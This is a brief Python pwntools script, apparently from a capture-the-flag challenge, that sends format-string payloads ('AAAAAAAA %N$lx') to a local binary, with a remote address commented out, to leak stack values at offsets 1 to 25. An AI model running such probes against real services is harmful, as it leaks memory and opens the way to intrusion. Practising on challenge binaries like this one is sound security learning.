
from pwn import *

context.log_level = 'critical'
BINARY = './pwn_secret'

for i in range(1, 26):
	p = process(BINARY)
	#p = remote('206.81.24.129', 1339)
	p.sendlineafter(': ', 'AAAAAAAA %{}$lx'.format(i))
	print '%02d: '%(i) + p.recvline()[:-1]
	p.close()

print ''
